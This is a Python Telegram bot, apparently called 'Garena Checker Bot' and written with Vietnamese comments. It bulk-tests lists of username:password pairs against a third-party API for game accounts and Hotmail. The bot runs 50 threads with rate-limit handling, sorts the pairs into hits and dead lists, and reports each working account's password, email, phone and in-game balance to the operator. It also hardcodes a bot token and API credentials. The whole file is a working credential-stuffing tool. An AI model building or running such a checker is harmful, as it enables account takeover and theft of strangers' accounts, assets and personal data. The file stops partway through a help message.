# bot.py - GARENA CHECKER BOT - FULL FIX + DELAY API + TRA KET QUA
import subprocess
import sys
import importlib
import threading
import time
import json
import os
import re
import telebot
import requests
import signal
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton

def install_package(package_name):
    try:
        importlib.import_module(package_name)
    except ImportError:
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", package_name, "--no-cache-dir"])
        except:
            pass

for pkg in ["requests", "pyTelegramBotAPI"]:
    install_package(pkg)

# ========== FIX CHO RENDER WEB SERVICE ==========
import os as os_module
import threading as threading_module
from http.server import HTTPServer, BaseHTTPRequestHandler

class RenderHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.end_headers()
            html = """<!DOCTYPE html>
<html>
<head><title>Garena Checker Bot</title></head>
<body style="font-family:Arial;text-align:center;padding:50px;background:#0a0a0a;color:#00ff00;">
<h1>Garena Checker Bot</h1>
<p>Status: <b style="color:#00ff00;">ALIVE</b></p>
<p>Admin: <a href="https://t.me/baohuyno1" style="color:#00ff00;">@baohuyno1</a></p>
<p>Version: <b>2.1 - DELAY + RESULT</b></p>
</body>
</html>"""
            self.wfile.write(html.encode('utf-8'))
        elif self.path == '/ping':
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"pong")
        else:
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"Bot is running!")
    
    def log_message(self, format, *args):
        pass

def start_render_server():
    try:
        port = int(os_module.environ.get("PORT", 10000))
        server = HTTPServer(("0.0.0.0", port), RenderHandler)
        print(f"[*] Render web server chay tren port {port}")
        server.serve_forever()
    except Exception as e:
        print(f"[!] Loi web server: {e}")

threading_module.Thread(target=start_render_server, daemon=True).start()
# ==============================================

# ========== CẤU HÌNH ==========
TELEGRAM_BOT_TOKEN = "6367532329:AAEem2DziNWKZtFrA8goj5PGTOI4MVT7IKA"
ADMIN_CHAT_ID = "5736655322"
ADMIN_USERNAME = "baohuyno1"

API_BASE = "https://lol.nhatminh301.com"
API_USERNAME = "thaituduc"
API_PASSWORD = "thaituduc"

DEFAULT_THREADS = 50  # Giam thread de tranh ban
DEFAULT_TIMEOUT = 30
DEFAULT_RETRIES = 3
API_DELAY = 0.5  # Delay giua cac request (giay)

OUTPUT_HITS = "hits.txt"
OUTPUT_DEAD = "dead.txt"
OUTPUT_FILTERED = "filtered_accounts.txt"
OUTPUT_UNKNOWN = "unknown.txt"
OUTPUT_ERROR = "error.txt"
OUTPUT_RESULT = "result_full.txt"

MAX_MESSAGE_LENGTH = 4000

# ========== DANH SÁCH SERVICE ==========
SERVICE_ROUTES = {
    "lienquan": {
        "route": "/api/lienquan",
        "desc": "Lien Quan Mobile",
        "icon": "🎮"
    },
    "miniworld": {
        "route": "/api/miniworld",
        "desc": "Mini World",
        "icon": "🌍"
    },
    "blockmango": {
        "route": "/api/blockmango",
        "desc": "Blockman Go",
        "icon": "🧱"
    },
    "deltaforce": {
        "route": "/api/deltaforce",
        "desc": "Delta Force",
        "icon": "🔫"
    },
    "hotmail": {
        "route": "/api/hotmail",
        "desc": "Hotmail",
        "icon": "📧"
    },
    "fc": {
        "route": "/api/fc",
        "desc": "FC Online",
        "icon": "⚽"
    },
    "fullpack": {
        "route": "/api/fullpack",
        "desc": "Fullpack",
        "icon": "📦"
    }
}

# ========== BIẾN TOÀN CỤC ==========
checking = False
stop_event = threading.Event()
filtered_accounts = []
pending_accounts = []
stats = {"total": 0, "checked": 0, "hits": 0, "dead": 0, "errors": 0, "unknown": 0}
file_lock = threading.Lock()
stats_lock = threading.Lock()
bot_start_time = datetime.now()
result_cache = []  # Cache kết quả để gửi sau

bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN, parse_mode="HTML")

def is_admin(chat_id):
    return str(chat_id) == str(ADMIN_CHAT_ID)

# ========== HÀM GỬI TIN NHẮN AN TOÀN ==========
def safe_send_message(chat_id, text, reply_markup=None, parse_mode="HTML"):
    if not text:
        return
    
    if len(text) > MAX_MESSAGE_LENGTH:
        parts = []
        current_part = ""
        lines = text.split('\n')
        
        for line in lines:
            if len(current_part) + len(line) + 1 > MAX_MESSAGE_LENGTH:
                parts.append(current_part)
                current_part = line + '\n'
            else:
                current_part += line + '\n'
        
        if current_part:
            parts.append(current_part)
        
        for i, part in enumerate(parts):
            try:
                if i == len(parts) - 1 and reply_markup:
                    bot.send_message(chat_id, part.strip(), parse_mode=parse_mode, reply_markup=reply_markup)
                else:
                    bot.send_message(chat_id, part.strip(), parse_mode=parse_mode)
                time.sleep(0.1)
            except Exception as e:
                print(f"[!] Loi gui tin nhan: {e}")
    else:
        try:
            bot.send_message(chat_id, text, parse_mode=parse_mode, reply_markup=reply_markup)
        except Exception as e:
            print(f"[!] Loi gui tin nhan: {e}")

# ========== TẠO NÚT BẤM ==========
def create_main_keyboard():
    keyboard = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    buttons = [
        KeyboardButton("📝 Gui TK MK"),
        KeyboardButton("📁 Gui File TXT"),
        KeyboardButton("🔍 Loc TK MK tu TXT"),
        KeyboardButton("📊 Trang thai"),
        KeyboardButton("📥 Tai Hits"),
        KeyboardButton("📥 Tai Dead"),
        KeyboardButton("📥 Tai Ket Qua"),
        KeyboardButton("⏹ Dung check"),
        KeyboardButton("👤 Admin"),
        KeyboardButton("📋 Danh sach Service")
    ]
    keyboard.add(*buttons)
    return keyboard

def create_service_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=2)
    buttons = []
    
    for key, value in SERVICE_ROUTES.items():
        btn = InlineKeyboardButton(
            f"{value['icon']} {value['desc']}",
            callback_data=f"check_{key}"
        )
        buttons.append(btn)
    
    keyboard.add(*buttons)
    return keyboard

def create_admin_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=2)
    buttons = [
        InlineKeyboardButton("👤 Admin: @baohuyno1", url="https://t.me/baohuyno1"),
        InlineKeyboardButton("📊 Trang thai", callback_data="admin_status"),
        InlineKeyboardButton("📥 Hits", callback_data="admin_hits"),
        InlineKeyboardButton("📥 Dead", callback_data="admin_dead"),
        InlineKeyboardButton("📥 Ket Qua", callback_data="admin_result"),
        InlineKeyboardButton("⏹ Dung check", callback_data="admin_stop"),
        InlineKeyboardButton("🗑 Xoa pending", callback_data="admin_clear"),
        InlineKeyboardButton("📋 Danh sach service", callback_data="admin_services")
    ]
    keyboard.add(*buttons)
    return keyboard

# ========== LỌC TK MK ==========
def loc_tk_mk(content):
    accounts = []
    seen = set()
    
    if not content:
        return accounts
    
    lines = content.split('\n')
    
    for line in lines:
        line = line.strip()
        if not line:
            continue
        
        user = None
        pwd = None
        
        separators = [':', '|', '/', '\t', ';', ' ']
        for sep in separators:
            if sep in line:
                parts = line.split(sep, 1)
                if len(parts) == 2:
                    user = parts[0].strip()
                    pwd = parts[1].strip()
                    if user and pwd:
                        break
                    else:
                        user = None
                        pwd = None
        
        if not user or not pwd:
            continue
        
        user_clean = re.sub(r'[^\w.@.-]', '', user)
        pwd_clean = pwd.strip()
        
        if len(user_clean) > 0 and len(pwd_clean) > 0:
            key = f"{user_clean}:{pwd_clean}"
            if key not in seen:
                seen.add(key)
                accounts.append((user_clean, pwd_clean))
    
    return accounts

# ========== CHECK API VỚI DELAY ==========
def check_account_api_with_delay(username, password, service):
    route = SERVICE_ROUTES.get(service, {}).get("route", "/api/lienquan")
    url = f"{API_BASE}{route}"
    
    params = {
        "username": API_USERNAME,
        "password": API_PASSWORD,
        "tk": username,
        "mk": password
    }
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "application/json"
    }
    
    # Thêm delay trước khi gọi API
    time.sleep(API_DELAY)
    
    for attempt in range(DEFAULT_RETRIES):
        try:
            resp = requests.get(url, params=params, headers=headers, timeout=DEFAULT_TIMEOUT)
            
            if resp.status_code == 200:
                try:
                    data = resp.json()
                    if isinstance(data, dict):
                        if data.get("status") == True or data.get("success") == True:
                            data["result"] = "hit"
                        elif data.get("status") == False or data.get("success") == False:
                            data["result"] = "dead"
                        else:
                            if "uid" in data or "name" in data or "data" in data:
                                data["result"] = "hit"
                            else:
                                data["result"] = "dead"
                    return data
                except json.JSONDecodeError:
                    if "success" in resp.text.lower() or "ok" in resp.text.lower():
                        return {"result": "hit", "raw": resp.text[:200]}
                    else:
                        return {"result": "dead", "raw": resp.text[:200]}
            elif resp.status_code == 429:
                time.sleep(5)
            elif resp.status_code >= 500:
                time.sleep(3)
            else:
                time.sleep(1)
        except requests.exceptions.Timeout:
            time.sleep(2)
        except requests.exceptions.ConnectionError:
            time.sleep(3)
        except:
            time.sleep(2)
    
    return {"result": "error", "message": "Request failed after retries"}

# ========== FORMAT KẾT QUẢ CHI TIẾT ==========
def format_result_detailed(username, password, data, service=""):
    if isinstance(data, str):
        try:
            data = json.loads(data)
        except:
            pass
    
    if not isinstance(data, dict):
        return {
            "status": "hit" if "hit" in str(data).lower() else "unknown",
            "username": username,
            "password": password,
            "service": service,
            "info": {}
        }
    
    # Lấy thông tin chi tiết
    info = {
        "uid": data.get("uid", data.get("id", "N/A")),
        "name": data.get("name", data.get("nickname", data.get("aov_name", "N/A"))),
        "region": data.get("region", data.get("country", "VN")),
        "shells": data.get("shells", data.get("so", data.get("coins", 0))),
        "rank": data.get("aov_rank", data.get("rank", data.get("tier", "N/A"))),
        "level": data.get("aov_level", data.get("level", data.get("lv", 0))),
        "skins": data.get("aov_total_skins", data.get("skin", data.get("skins", 0))),
        "heroes": data.get("aov_total_champs", data.get("hero", data.get("champs", 0))),
        "email": data.get("email", data.get("mail", "N/A")),
        "phone": data.get("phone", data.get("mobile", "N/A"))
    }
    
    result = {
        "status": data.get("result", "unknown"),
        "username": username,
        "password": password,
        "service": service,
        "info": info
    }
    
    return result

def format_hit_text(result):
    info = result["info"]
    service_icon = SERVICE_ROUTES.get(result["service"], {}).get("icon", "🎮")
    service_desc = SERVICE_ROUTES.get(result["service"], {}).get("desc", result["service"])
    
    return f"""
{service_icon} ✅ HIT - {service_desc}
🔑 {result['username']}:{result['password']}
🆔 UID: {info['uid']}
👤 Name: {info['name']}
🌐 Region: {info['region']}
💰 So: {info['shells']}
👑 Rank: {info['rank']}
✨ Level: {info['level']}
💎 Skin: {info['skins']}
⚔️ Hero: {info['heroes']}
📧 Email: {info['email']}
📱 Phone: {info['phone']}
⏱ Time: {datetime.now().strftime('%H:%M:%S')}
"""

def format_dead_text(username, password, service=""):
    service_icon = SERVICE_ROUTES.get(service, {}).get("icon", "🎮")
    service_desc = SERVICE_ROUTES.get(service, {}).get("desc", service)
    return f"""
{service_icon} ❌ DEAD - {service_desc}
🔑 {username}:{password}
⏱ Time: {datetime.now().strftime('%H:%M:%S')}
"""

# ========== LƯU KẾT QUẢ CHI TIẾT ==========
def save_result_detailed(result):
    with file_lock:
        # Lưu vào file kết quả đầy đủ
        with open(OUTPUT_RESULT, 'a', encoding='utf-8') as f:
            f.write(json.dumps(result, ensure_ascii=False) + '\n')
        
        # Lưu theo từng loại
        status = result.get("status", "unknown")
        user = result["username"]
        pwd = result["password"]
        service = result.get("service", "unknown")
        
        if status == "hit":
            with open(OUTPUT_HITS, 'a', encoding='utf-8') as f:
                f.write(f"{user}:{pwd}\n")
        elif status == "dead":
            with open(OUTPUT_DEAD, 'a', encoding='utf-8') as f:
                f.write(f"{user}:{pwd}\n")
        elif status == "unknown":
            with open(OUTPUT_UNKNOWN, 'a', encoding='utf-8') as f:
                f.write(f"{user}:{pwd}\n")
        else:
            with open(OUTPUT_ERROR, 'a', encoding='utf-8') as f:
                f.write(f"{user}:{pwd}\n")

# ========== CHECK ĐƠN CÓ KẾT QUẢ ==========
def check_single_with_result(chat_id, username, password, service="lienquan"):
    service_desc = SERVICE_ROUTES.get(service, {}).get("desc", service)
    safe_send_message(chat_id, f"🔍 Dang check <code>{username}:{password}</code> voi {service_desc}...")
    
    raw_result = check_account_api_with_delay(username, password, service)
    result_type = raw_result.get("result", "unknown")
    
    result = format_result_detailed(username, password, raw_result, service)
    result["status"] = result_type
    
    # Lưu kết quả
    save_result_detailed(result)
    
    # Gửi kết quả
    if result_type == "hit":
        safe_send_message(chat_id, format_hit_text(result))
    elif result_type == "dead":
        safe_send_message(chat_id, format_dead_text(username, password, service))
    elif result_type == "unknown":
        safe_send_message(chat_id, f"⚠️ UNKNOWN - {service.upper()}\n🔑 {username}:{password}\n❓ Khong xac dinh")
    else:
        safe_send_message(chat_id, f"⚠️ ERROR - {service.upper()}\n🔑 {username}:{password}\n❌ Loi khi check")

# ========== CHECK NHIỀU CÓ KẾT QUẢ ==========
def check_batch_with_result(chat_id, accounts, service):
    global checking, stats
    
    if checking:
        safe_send_message(chat_id, "⚠️ Dang check roi!")
        return
    
    checking = True
    stop_event.clear()
    
    total = len(accounts)
    stats = {
        "total": total,
        "checked": 0,
        "hits": 0,
        "dead": 0,
        "errors": 0,
        "unknown": 0,
        "start_time": time.time()
    }
    
    service_desc = SERVICE_ROUTES.get(service, {}).get("desc", service)
    icon = SERVICE_ROUTES.get(service, {}).get("icon", "🔍")
    
    safe_send_message(chat_id, f"""
{icon} <b>BAT DAU CHECK</b>
📊 Tong: <code>{total}</code> accounts
🎯 Service: <b>{service_desc}</b>
⚡ Threads: <code>{DEFAULT_THREADS}</code>
⏱ Delay: <code>{API_DELAY}s</code>
⏱ Bat dau: {datetime.now().strftime('%H:%M:%S')}
""")
    
    def process_single(user, pwd):
        if stop_event.is_set():
            return
        
        raw_result = check_account_api_with_delay(user, pwd, service)
        result_type = raw_result.get("result", "unknown")
        
        result = format_result_detailed(user, pwd, raw_result, service)
        result["status"] = result_type
        
        # Lưu kết quả
        save_result_detailed(result)
        
        with stats_lock:
            stats["checked"] += 1
            
            if result_type == "hit":
                stats["hits"] += 1
                try:
                    safe_send_message(chat_id, format_hit_text(result))
                except:
                    pass
            elif result_type == "dead":
                stats["dead"] += 1
            elif result_type == "unknown":
                stats["unknown"] += 1
            else:
                stats["errors"] += 1
            
            # Cập nhật tiến độ mỗi 20 accounts
            if stats["checked"] % 20 == 0:
                try:
                    elapsed = time.time() - stats["start_time"]
                    speed = stats["checked"] / elapsed if elapsed > 0 else 0
                    percent = (stats["checked"] / total) * 100
                    safe_send_message(chat_id, f"""
📊 <b>TIEN DO</b>
✅ Checked: <code>{stats['checked']}/{total}</code> ({percent:.1f}%)
🔴 Hits: <code>{stats['hits']}</code>
❌ Dead: <code>{stats['dead']}</code>
❓ Unknown: <code>{stats['unknown']}</code>
⚠️ Errors: <code>{stats['errors']}</code>
⚡ Speed: <code>{speed:.1f}</code> acc/s
""")
                except:
                    pass
    
    with ThreadPoolExecutor(max_workers=DEFAULT_THREADS) as executor:
        futures = {executor.submit(process_single, user, pwd): (user, pwd) 
                   for user, pwd in accounts}
        
        for future in as_completed(futures):
            if stop_event.is_set():
                executor.shutdown(wait=False)
                break
    
    checking = False
    elapsed = time.time() - stats["start_time"]
    
    result_msg = f"""
✅ <b>CHECK HOAN TAT!</b>
📊 Tong: <code>{stats['total']}</code>
🔴 HIT: <code>{stats['hits']}</code>
❌ DEAD: <code>{stats['dead']}</code>
❓ UNKNOWN: <code>{stats['unknown']}</code>
⚠️ Errors: <code>{stats['errors']}</code>
⏱ Thoi gian: <code>{elapsed:.1f}s</code>
⚡ Toc do: <code>{stats['total']/elapsed:.1f}</code> acc/s
"""
    safe_send_message(chat_id, result_msg)
    
    # Gửi file kết quả tổng hợp
    if os.path.exists(OUTPUT_RESULT):
        try:
            with open(OUTPUT_RESULT, 'rb') as f:
                bot.send_document(chat_id, f, caption=f"📊 result_full.txt (Tong: {stats['total']})")
        except:
            pass

# ========== XỬ LÝ CALLBACK ==========
@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    global pending_accounts, filtered_accounts, checking
    
    if not is_admin(call.message.chat.id):
        bot.answer_callback_query(call.id, "❌ Ban khong co quyen!")
        return
    
    data = call.data
    
    if data.startswith("check_"):
        service = data.replace("check_", "")
        
        if service not in SERVICE_ROUTES:
            bot.answer_callback_query(call.id, "❌ Service khong hop le!")
            return
        
        try:
            bot.delete_message(call.message.chat.id, call.message.message_id)
        except:
            pass
        
        service_desc = SERVICE_ROUTES[service]["desc"]
        icon = SERVICE_ROUTES[service]["icon"]
        
        if pending_accounts:
            accounts = pending_accounts
            pending_accounts = []
            
            if len(accounts) == 1:
                user, pwd = accounts[0]
                threading.Thread(target=check_single_with_result, args=(call.message.chat.id, user, pwd, service)).start()
            else:
                filtered_accounts = accounts
                threading.Thread(target=check_batch_with_result, args=(call.message.chat.id, accounts, service)).start()
        else:
            bot.answer_callback_query(call.id, "❌ Khong co accounts de check!")
    
    elif data == "admin_status":
        if checking:
            elapsed = time.time() - stats.get("start_time", time.time())
            speed = stats["checked"] / elapsed if elapsed > 0 else 0
            safe_send_message(call.message.chat.id, f"""
📊 <b>TRANG THAI</b>
🔄 Dang check: <b>YES</b>
✅ Checked: <code>{stats['checked']}/{stats['total']}</code>
🔴 HIT: <code>{stats['hits']}</code>
❌ DEAD: <code>{stats['dead']}</code>
❓ UNKNOWN: <code>{stats['unknown']}</code>
⚠️ Errors: <code>{stats['errors']}</code>
⚡ Speed: <code>{speed:.1f}</code> acc/s
⏱ Delay: <code>{API_DELAY}s</code>
""")
        else:
            safe_send_message(call.message.chat.id, "💤 Bot dang ranh")
        bot.answer_callback_query(call.id)
    
    elif data == "admin_hits":
        try:
            with open(OUTPUT_HITS, 'rb') as f:
                bot.send_document(call.message.chat.id, f, caption="✅ hits.txt")
        except:
            safe_send_message(call.message.chat.id, "❌ Chua co hits!")
        bot.answer_callback_query(call.id)
    
    elif data == "admin_dead":
        try:
            with open(OUTPUT_DEAD, 'rb') as f:
                bot.send_document(call.message.chat.id, f, caption="❌ dead.txt")
        except:
            safe_send_message(call.message.chat.id, "❌ Chua co dead!")
        bot.answer_callback_query(call.id)
    
    elif data == "admin_result":
        try:
            with open(OUTPUT_RESULT, 'rb') as f:
                bot.send_document(call.message.chat.id, f, caption="📊 result_full.txt")
        except:
            safe_send_message(call.message.chat.id, "❌ Chua co ket qua!")
        bot.answer_callback_query(call.id)
    
    elif data == "admin_stop":
        stop_event.set()
        checking = False
        safe_send_message(call.message.chat.id, "🛑 Da dung check!")
        bot.answer_callback_query(call.id)
    
    elif data == "admin_clear":
        pending_accounts = []
        safe_send_message(call.message.chat.id, "✅ Da xoa danh sach pending!")
        bot.answer_callback_query(call.id)
    
    elif data == "admin_services":
        msg = "📋 <b>DANH SACH SERVICE</b>\n\n"
        for key, value in SERVICE_ROUTES.items():
            msg += f"{value['icon']} <b>{value['desc']}</b>\n"
            msg += f"   Route: <code>{value['route']}</code>\n\n"
        safe_send_message(call.message.chat.id, msg)
        bot.answer_callback_query(call.id)
    
    bot.answer_callback_query(call.id)

# ========== XỬ LÝ TEXT ==========
@bot.message_handler(content_types=['text'])
def handle_text(message):
    global pending_accounts
    
    if not is_admin(message.chat.id):
        return
    
    text = message.text.strip()
    
    # XỬ LÝ NÚT BẤM
    if text == "📝 Gui TK MK":
        safe_send_message(message.chat.id, """
📌 <b>GUI TK MK</b>
Gui truc tiep <code>user:pass</code> hoac nhieu accounts

VD:
<code>user1:pass123</code>
<code>user2:pass456</code>
<code>user3:pass789</code>
""")
        return
    
    elif text == "📁 Gui File TXT":
        safe_send_message(message.chat.id, """
📌 <b>GUI FILE TXT</b>
Gui file .txt chua danh sach tk mk
Bot se tu dong loc va check!
""")
        return
    
    elif text == "🔍 Loc TK MK tu TXT":
        safe_send_message(message.chat.id, """
🔍 <b>LOC TK MK TU TXT</b>

📌 Gui file .txt chua danh sach tai khoan
Bot se loc chi giu lai <code>user:pass</code>

📌 Ho tro dinh dang:
• <code>user:pass</code>
• <code>user|pass</code>
• <code>user/pass</code>

📌 Sau khi loc xong, chon service de check!
""")
        return
    
    elif text == "📊 Trang thai":
        if checking:
            elapsed = time.time() - stats.get("start_time", time.time())
            speed = stats["checked"] / elapsed if elapsed > 0 else 0
            safe_send_message(message.chat.id, f"""
📊 <b>TRANG THAI</b>
🔄 Dang check: <b>YES</b>
✅ Checked: <code>{stats['checked']}/{stats['total']}</code>
🔴 HIT: <code>{stats['hits']}</code>
❌ DEAD: <code>{stats['dead']}</code>
❓ UNKNOWN: <code>{stats['unknown']}</code>
⚠️ Errors: <code>{stats['errors']}</code>
⚡ Speed: <code>{speed:.1f}</code> acc/s
⏱ Delay: <code>{API_DELAY}s</code>
""")
        else:
            safe_send_message(message.chat.id, "💤 Bot dang ranh")
        return
    
    elif text == "📥 Tai Hits":
        try:
            with open(OUTPUT_HITS, 'rb') as f:
                bot.send_document(message.chat.id, f, caption="✅ hits.txt")
        except:
            safe_send_message(message.chat.id, "❌ Chua co hits!")
        return
    
    elif text == "📥 Tai Dead":
        try:
            with open(OUTPUT_DEAD, 'rb') as f:
                bot.send_document(message.chat.id, f, caption="❌ dead.txt")
        except:
            safe_send_message(message.chat.id, "❌ Chua co dead!")
        return
    
    elif text == "📥 Tai Ket Qua":
        try:
            with open(OUTPUT_RESULT, 'rb') as f:
                bot.send_document(message.chat.id, f, caption="📊 result_full.txt")
        except:
            safe_send_message(message.chat.id, "❌ Chua co ket qua!")
        return
    
    elif text == "⏹ Dung check":
        stop_event.set()
        checking = False
        safe_send_message(message.chat.id, "🛑 Da dung check!")
        return
    
    elif text == "👤 Admin":
        safe_send_message(message.chat.id, """
👤 <b>ADMIN</b>
📌 Admin: @baohuyno1
🔗 Lien he: https://t.me/baohuyno1

📋 <b>CHUC NANG ADMIN:</b>
• Quan ly bot
• Xem trang thai
• Tai hits/dead/ketqua
• Dung check
• Xoa pending
""", reply_markup=create_admin_keyboard())
        return
    
    elif text == "📋 Danh sach Service":
        msg = "📋 <b>DANH SACH SERVICE</b>\n\n"
        for key, value in SERVICE_ROUTES.items():
            msg += f"{value['icon']} <b>{value['desc']}</b>\n"
            msg += f"   Route: <code>{value['route']}</code>\n\n"
        safe_send_message(message.chat.id, msg)
        return
    
    if text.startswith('/'):
        return
    
    # XỬ LÝ TK MK
    accounts = loc_tk_mk(text)
    
    if not accounts:
        safe_send_message(message.chat.id, """
❌ <b>KHONG TIM THAY!</b>
Format dung: <code>user:pass</code> hoac <code>user|pass</code> hoac <code>user/pass</code>

📌 Vi du:
<code>ZzkeconzZ:thanhoppa2001</code>
""")
        return
    
    pending_accounts = accounts
    
    preview = '\n'.join([f"{u}:{p}" for u, p in accounts[:10]])
    total = len(accounts)
    
    msg = f"""
📌 <b>DA NHAN {total} ACCOUNTS</b>

<b>Preview (10 dong dau):</b>
<code>{preview}</code>
{"..." if total > 10 else ""}

👇 <b>Chon service de check:</b>
"""
    
    safe_send_message(message.chat.id, msg, reply_markup=create_service_keyboard())

# ========== XỬ LÝ FILE ==========
@bot.message_handler(content_types=['document'])
def handle_document(message):
    global pending_accounts
    
    if not is_admin(message.chat.id):
        return
    
    try:
        if not message.document.file_name.endswith('.txt'):
            safe_send_message(message.chat.id, "❌ Chi ho tro file .txt!")
            return
        
        file_info = bot.get_file(message.document.file_id)
        content = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore')
        accounts = loc_tk_mk(content)
        
        if not accounts:
            safe_send_message(message.chat.id, "❌ Khong tim thay user:pass trong file!")
            return
        
        pending_accounts = accounts
        
        with open(OUTPUT_FILTERED, 'w', encoding='utf-8') as f:
            for user, pwd in accounts:
                f.write(f"{user}:{pwd}\n")
        
        preview = '\n'.join([f"{u}:{p}" for u, p in accounts[:20]])
        total = len(accounts)
        
        msg = f"""
✅ <b>LOC XONG!</b>
📊 Tong: <code>{total}</code> accounts

<b>Preview (20 dong dau):</b>
<code>{preview}</code>
{"..." if total > 20 else ""}

👇 <b>Chon service de check:</b>
"""
        
        safe_send_message(message.chat.id, msg, reply_markup=create_service_keyboard())
        
    except Exception as e:
        safe_send_message(message.chat.id, f"❌ Loi: {e}")

# ========== LỆNH /start ==========
@bot.message_handler(commands=['start'])
def cmd_start(message):
    if not is_admin(message.chat.id):
        return
    
    uptime = datetime.now() - bot_start_time
    hours = uptime.seconds // 3600
    minutes = (uptime.seconds % 3600) // 60
    
    try:
        bot.send_message(
            message.chat.id,
            f"""
🤖 <b>GARENA CHECKER BOT V2.1</b>
👤 Admin: <a href="https://t.me/baohuyno1">@baohuyno1</a>
⏱ Uptime: <code>{hours}h {minutes}m</code>
⏱ Delay API: <code>{API_DELAY}s</code>

📌 <b>CACH DUNG:</b>

1️⃣ <b>GUI TK MK</b>
Gui truc tiep <code>user:pass</code>
→ Chon service bang nut bam

2️⃣ <b>GUI FILE TXT</b>
Gui file .txt chua danh
